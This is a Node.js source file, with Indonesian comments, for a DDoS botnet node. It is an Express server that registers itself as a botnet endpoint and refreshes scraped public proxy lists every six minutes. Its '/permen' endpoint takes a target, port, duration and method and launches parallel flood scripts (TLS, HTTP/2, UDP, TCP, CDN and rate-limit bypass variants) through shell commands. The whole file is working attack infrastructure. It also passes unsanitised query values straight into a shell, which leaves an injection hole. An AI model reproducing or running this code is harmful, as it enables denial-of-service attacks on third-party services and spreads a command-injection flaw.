const os = require('os');
const axios = require('axios');
const { spawn } = require('child_process');
const process = require('process');
const express = require('express');
const { setTimeout, setInterval } = require('timers');

const app = express();
const port = parseInt(process.env.PORT || process.env.SERVER_PORT || 5032);

// Menyimpan daftar PID proses node yang berjalan
const active_processes = {};

async function fetch_data() {
   // """Mengambil data dari API eksternal untuk mendapatkan alamat IP"""
    try {
        const response = await axios.get('https://api.ipify.org?format=json', { timeout: 120000 });
        const data = response.data;

        const ip_address = data.ip || 'Unknown IP';
        console.log(`Copy This Add To Botnet -> http://${ip_address}:${port}`);

        return data;
    } catch (error) {
        if (error.code === 'ECONNABORTED') {
            console.log("Error: Permintaan ke server terlalu lama.");
        } else if (error.code === 'ECONNREFUSED' || error.code === 'ENOTFOUND') {
            console.log("Error: Tidak dapat terhubung ke server.");
        } else {
            console.log(`Error fetching data: ${error.message}`);
        }
    }

    return null;
}

async function scrape_proxy() {
   // """Mengambil daftar proxy dari beberapa sumber dan menyimpannya ke file"""
    const sources = [
    // === HTTP / HTTPS (AKTIF) ===
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http",
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=https",

    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",

    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
    "https://cdn.jsdelivr.net/gh/sunny9577/proxy-scraper/proxies.txt",

    // === SOCKS2 ===
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks2.txt",
    "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks2.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks2.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS2_RAW.txt",

    // === SOCKS5 ===
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
    "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt"
    ];

    const proxies = new Set();

    for (const url of sources) {
        try {
            const response = await axios.get(url, { timeout: 30000 });
            const new_proxies = response.data.trim().split("\n");
            new_proxies.forEach(proxy => proxies.add(proxy));
        } catch (error) {
            console.log(`Error fetching from ${url}: ${error.message}`);
        }
    }

    if (proxies.size > 0) {
        const fs = require('fs');
        fs.writeFileSync("proxy.txt", Array.from(proxies).join("\n"));
        console.log(`Total proxies saved: ${proxies.size}`);
    } else {
        console.log("No proxies fetched.");
    }
}

function scrape_proxy_loop() {
  //  """Loop untuk scrape proxy setiap 6 menit"""
    setInterval(async () => {
        await scrape_proxy();
    }, 360000);  // 6 menit
}

function generate_command(target, port, time, methods) {
   // """Menghasilkan perintah berdasarkan metode serangan yang dipilih"""
    const metode = `${process.cwd()}/api/${methods}`;

    const commands = {
        'tls': `node ${metode} ${target} ${time} 32 5`,
        'http': `node ${metode} ${target} ${time}`,
        'bomb': `node ${metode} ${target} ${time} 32 2 proxy.txt`,
        'mix': `node ${metode} ${target} ${time} 32 5`,
        'bypass': `node ${metode} ${target} ${time} 32 2 proxy.txt`,
        'https': `node ${metode} ${target} ${time} 32 2 proxy.txt flood`,
        'storm': `node ${metode} ${target} ${time} 32 2 proxy.txt`,
        'flood': `node ${metode} ${target} ${time} 32 2 proxy.txt`,
        'h2-volt': `node ${metode} ${target} ${time} 32 2 proxy.txt`,
        'h2-flash': `node ${metode} ${target} ${time} 32 2 proxy.txt`,
        'h2-code': `node ${metode} ${target} ${time} 32 2 proxy.txt`,
        'h2-blast': `node ${metode} ${target} ${time} 32 2 proxy.txt`,
        'h2-kill': `node ${metode} ${target} ${time} 32 2 proxy.txt`,
        'h2-glo': `node ${metode} ${target} ${time} 32 2 proxy.txt`,
        'h2-god': `node ${metode} ${target} ${time} 16 2 proxy.txt`,
        'h2-fast': `node ${metode} GET ${target} ${time} 2 32 proxy.txt --query 1 --delay 1 --bfm true --ratelimit true --randrate true --cdn true --full --legit --precheck true`,
        'tcp': `node ${metode} ${target} ${port} ${time}`,
        'udp': `node ${metode} ${target} ${port} ${time}`
    };
    
    return commands[methods];
}

function terminate_processes(pids) {
  //  """Menghentikan semua proses node berdasarkan daftar PID setelah waktu yang ditentukan"""
    for (const pid of pids) {
        try {
            process.kill(pid, 'SIGTERM');
            console.log(`Process ${pid} (node) terminated successfully.`);
            delete active_processes[pid];  // Hapus dari daftar proses aktif
        } catch (error) {
            if (error.code === 'ESRCH') {
                console.log(`Process ${pid} sudah berhenti.`);
            } else {
                console.log(`Gagal menghentikan proses ${pid}: ${error.message}`);
            }
        }
    }
}

app.get('/permen', async (req, res) => {
   // """Endpoint untuk memulai proses node berdasarkan permintaan pengguna"""
    const { target, port, time, methods, concurrency } = req.query;

    if (!target || !time || !methods) {
        return res.status(400).json({ detail: "Semua parameter (target, time, methods) harus disediakan" });
    }

    const concurrency_num = concurrency || 2;  // Default 5 jika tidak disediakan

    const response_data = {
        "status": "Serangan Dimulai....",
        "target": target,
        "port": port,
        "time": time,
        "methods": methods,
        "concurrency": concurrency_num
    };

    const command = generate_command(target, port, time, methods);

    if (command) {
        console.log(`Received request: ${methods} with concurrency ${concurrency_num}`);
        console.log(`Executing command: ${command}`);

        const pids = [];

        // Jalankan beberapa instance secara paralel
        for (let i = 0; i < concurrency_num; i++) {
            const process = spawn(command, { shell: true, stdio: 'ignore' });
            const pid = process.pid;
            active_processes[pid] = process;
            pids.push(pid);
            console.log(`Process started with PID ${pid} (instance ${i + 1})`);
        }

        // Jadwalkan penghentian semua proses node setelah `time` detik
        setTimeout(() => terminate_processes(pids), time * 1000);

    } else {
        console.log('Metode tidak valid diberikan.');
    }

    res.json(response_data);
});

if (require.main === module) {
    fetch_data();
    
    // Mulai loop untuk scraping proxy setiap 6 menit
    scrape_proxy_loop();
    
    app.listen(port, '0.0.0.0', () => {
        console.log(`Server running on port ${port}`);
    });
}